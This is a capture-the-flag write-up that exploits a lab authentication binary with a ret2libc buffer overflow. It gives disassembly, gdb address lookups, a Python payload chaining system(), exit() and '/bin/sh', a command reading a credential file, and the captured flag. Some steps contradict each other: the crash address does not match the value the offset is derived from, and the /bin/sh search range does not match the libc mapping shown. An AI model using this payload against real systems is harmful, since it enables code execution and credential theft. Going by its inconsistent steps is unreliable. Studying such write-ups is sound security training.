# Ret2libc again

On this level we are provided with a program emulating an authentication system, to verify the username and password we have the respective functions which process this logic. The one that processes the username leaves the verification data visible, the username is **dat_wil**, this data is stored at address **`0x80486a8`**.

```
08048464 <verify_user_name>:
...
8048478:	ba 40 a0 04 08       	mov    $0x804a040,%edx
804847d:	b8 a8 86 04 08       	mov    $0x80486a8,%eax
8048482:	b9 07 00 00 00       	mov    $0x7,%ecx
8048487:	89 d6                	mov    %edx,%esi
8048489:	89 c7                	mov    %eax,%edi
804848b:	f3 a6                   repz cmpsb %es:(%edi),%ds:(%esi)
```
Once this check has been passed, and we are invited to the password prompt, we inject an offset pattern for buffer overflow injection, since the second **`fgets()`** is exploitable here :

>Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

`Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()`

Our offset is therefore 80 Bytes according to the **0x41306241** value (I did this manipulation with an offset generator).

- Retrieve **`system()`** address
```
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
```
- Retrieve **`exit()`** address
```
(gdb) p exit
$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
```

- Find **`"/bin/sh"`** string address in libc-2.15.so, `find [start lib addr], [end lib addr], [pattern]`
```
(gdb) info proc map
process 1865
Mapped address spaces:

Start Addr   End Addr       Size     Offset objfile
...
0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...

(gdb) find 0x7ffff7a1c000,0x7ffff7bd2000,"/bin/sh"
0xf7f897ec
1 pattern found.
```

This payload will allow us to exploit the flaw present here
```py
python -c 'print "dat_wil\n"+"B"*80+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"' > /tmp/boom
cat /home/users/level02/.pass
```
> Flag : `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv`
